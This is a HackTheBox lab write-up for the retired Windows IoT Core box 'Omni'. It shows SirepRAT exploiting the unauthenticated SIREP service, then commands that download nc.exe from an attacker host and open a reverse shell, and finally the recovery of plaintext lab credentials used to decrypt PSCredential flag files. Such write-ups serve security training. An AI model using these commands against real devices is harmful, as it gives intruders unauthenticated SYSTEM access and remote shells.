---
title: "Omni"
date: 2020-11-28
type: docs
tags:
  - htb
  - windows
  - easy
  - windows-iot
  - sirep
  - sireprat
  - unauthenticated-rce
  - iot-dashboard
  - import-clixml
  - pscredential
  - retired
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Windows 10 IoT Core, **Difficulty:** Easy, **Released:** 2020-11-28, **IP:** `10.10.10.204` , `omni.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. **Windows 10 IoT Core** device. The **SIREP / WPCon** test service on **port 29820** allows **unauthenticated command execution**.
2. Use **SirepRAT** to run commands, download `nc.exe` into a writable dir (`C:\Windows\System32\spool\drivers\color`), and catch a SYSTEM shell.
3. The IoT Device Portal (`:8080`) and `C:\Windows\System32\config\...\iot-admin.xml` hold credentials for **`app`** (`mesh5143`) and **`administrator`** (`_1nt3rn37ofth1nGz`).
4. Both flags are `Export-CliXml` **PSCredential** files. Run PowerShell **as the matching user** (SirepRAT + `runas` / `Start-Process -Credential`) and `Import-CliXml` to decrypt them.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `iot-admin.xml` | `app : mesh5143` |
| `iot-admin.xml` | `administrator : _1nt3rn37ofth1nGz` |
| `user.txt` | decrypt the PSCredential in `C:\Data\Users\app\` as `app` |
| `root.txt` | decrypt the PSCredential in `C:\Data\Users\administrator\` as `administrator` |

</div>

---

## Overview

Omni is the "Windows IoT Core" box and it teaches one specific, real thing: **the SIREP service**. Windows 10 IoT Core ships a test/provisioning service on 29817 to 29820 that, when the device is in test mode, lets a developer machine push files and run commands **with no authentication**, as SYSTEM. `SirepRAT` weaponises it. After that it is a credential hunt in the **IoT Device Portal** config and a Windows gotcha: the flags are not text, they are **encrypted PSCredential objects**, so you have to be the right user to decrypt them.

Related unauthenticated device/service RCE: [Antique](/writeups/hackthebox/linux/easy/antique/) (JetDirect), [Backdoor](/writeups/hackthebox/linux/easy/backdoor/) (gdbserver), [PC](/writeups/hackthebox/linux/easy/pc/) (gRPC). Related `Import-CliXml` / PSCredential: [POV](/writeups/hackthebox/windows/medium/pov/).

---

## Full Walkthrough

### Recon

```console
Open 10.10.10.204:135
Open 10.10.10.204:5985     # WinRM
Open 10.10.10.204:8080     # Windows Device Portal (auth required)
Open 10.10.10.204:29817
Open 10.10.10.204:29819
Open 10.10.10.204:29820
```

`http://omni.htb:8080/` returns "Authorization Required". Port 29820 returns a fixed 16-byte binary blob to any probe, that is the **SIREP** handshake.

### Foothold, SirepRAT

<div class="callout callout-note">

**SIREP / WPCon**

Windows 10 IoT Core in test mode runs `SirepServer`, used by Visual Studio to deploy and debug. It exposes RPC-like verbs (`LaunchCommandWithOutput`, `GetFileFromDevice`, `PutFileOnDevice`, `GetSystemInformation`) over TCP 29820 with **no auth**, executing as **SYSTEM**. SafeBreach's [SirepRAT](https://github.com/SafeBreach-Labs/SirepRAT) implements a client.

</div>

```bash
python SirepRAT.py omni.htb LaunchCommandWithOutput --return_output \
  --cmd "C:\Windows\System32\cmd.exe" --args " /c whoami"
# nt authority\system
```

`C:\Windows\System32\spool\drivers\color` is world-writable, stage a netcat there:

```bash
python SirepRAT.py omni.htb LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" \
  --args " /c powershell iwr -uri http://10.10.14.26/nc.exe -o C:\Windows\System32\spool\drivers\color\nc.exe"
python SirepRAT.py omni.htb LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" \
  --args " /c C:\Windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.26 9001"
```

```console
rlwrap nc -lnvp 9001
Microsoft Windows [Version 10.0.17763.107]
C:\windows\system32>
```

(My notes then chased NetNTLM over `smbserver.py`, which is a dead end here, SYSTEM already has what you need.)

### Credentials, IoT Device Portal config

```console
type C:\Windows\System32\config\systemprofile\AppData\Local\...\iot-admin.xml
# or   C:\Data\Users\System\...   (path varies by image)
```

```xml
<userdatabase>
  <user username="app"><password>mesh5143</password></user>
  <user username="administrator"><password>_1nt3rn37ofth1nGz</password></user>
</userdatabase>
```

(These also work to log into `:8080` / WinRM.)

### The flags are encrypted PSCredentials

```console
type C:\Data\Users\app\user.txt
# <Objs ...><Obj RefId="0"><TN><T>System.Management.Automation.PSCredential</T>...
```

<div class="callout callout-note">

**`Import-CliXml` needs the right user**

`Export-CliXml` on a `PSCredential` protects the password with **DPAPI scoped to the exporting user**. To read `user.txt` you must run `Import-CliXml` **as `app`**; for `root.txt`, **as `administrator`**. From the SYSTEM shell:
```powershell
$p = ConvertTo-SecureString 'mesh5143' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential('omni\app',$p)
Start-Process powershell -Credential $c -ArgumentList '-c','(Import-CliXml C:\Data\Users\app\user.txt).GetNetworkCredential().Password | Out-File C:\Data\Users\app\out.txt'
type C:\Data\Users\app\out.txt
```
Repeat with the `administrator` credential for `root.txt`. (evil-winrm as each user is cleaner: `evil-winrm -i omni.htb -u administrator -p '_1nt3rn37ofth1nGz'` then `Import-CliXml`.)

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `C:\Data\Users\app\user.txt` (PSCredential, decrypt as `app`) |
| `root.txt` | `C:\Data\Users\administrator\root.txt` (PSCredential, decrypt as `administrator`) |

---

## Lessons and Takeaways

- **Take IoT Core devices out of test mode** before deployment. The SIREP service is unauthenticated SYSTEM RCE by design.
- **Segment IoT devices.** They are rarely patched and expose developer services.
- **Do not store admin passwords in the Device Portal user database in cleartext** (it is what the platform does, but restrict who can read the config).
- **`Import-CliXml` / DPAPI credential files** are only as safe as the account that exported them. If you can run as that account, they are plaintext.

---

## Related Writeups

- **Unauthenticated device / service RCE:** [Antique](/writeups/hackthebox/linux/easy/antique/), [Backdoor](/writeups/hackthebox/linux/easy/backdoor/), [PC](/writeups/hackthebox/linux/easy/pc/)
- **`Import-CliXml` / PSCredential:** [POV](/writeups/hackthebox/windows/medium/pov/)
- **Config file with plaintext creds:** [Monitored](/writeups/hackthebox/linux/medium/monitored/), [Previse](/writeups/hackthebox/linux/easy/previse/)

## References

- SirepRAT (SafeBreach) <https://github.com/SafeBreach-Labs/SirepRAT>
- HTB Omni (0xdf) <https://0xdf.gitlab.io/2021/01/09/htb-omni.html>
- Windows IoT Core SIREP research <https://www.safebreach.com/blog/2019/sirep-rat-remote-administration-tool-for-windows-iot/>
